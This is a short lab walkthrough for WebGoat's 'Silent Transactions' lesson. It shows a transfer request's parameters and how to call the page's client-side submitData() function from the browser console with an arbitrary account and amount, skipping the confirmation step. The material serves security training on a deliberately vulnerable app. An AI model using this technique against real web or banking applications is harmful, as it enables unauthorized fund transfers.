## Silent Transactions Attack

When intercepting HTTP you will notice that GET request is made with all parameters shown eg.

```
GET /WebGoat/attack?Screen=144&menu=400&from=ajax&newAccount=test&amount=123&confirm=Transferring
```

To submit data silently, using Chrome 'Inspect element' and click 'Console' tab and issue `javascript:` and you should see one of the autocompleted commands is `javascript:submitData()`. If you enter it, below is the result

```javascript
javascript:submitData
submitData(accountNo, balance) {
var url = 'attack?Screen=144&menu=400&from=ajax&newAccount='+ accountNo+ '&amount=' + balance +'&confirm=' + document.getElementById('confirm').value; 
```

We can observe from this function `submitData()` requires 2 parameters which seems like what is the account number and balance amount to transfer. Issue the following command in console.

```javascript
javascript:submitData(123,999999999999999)
```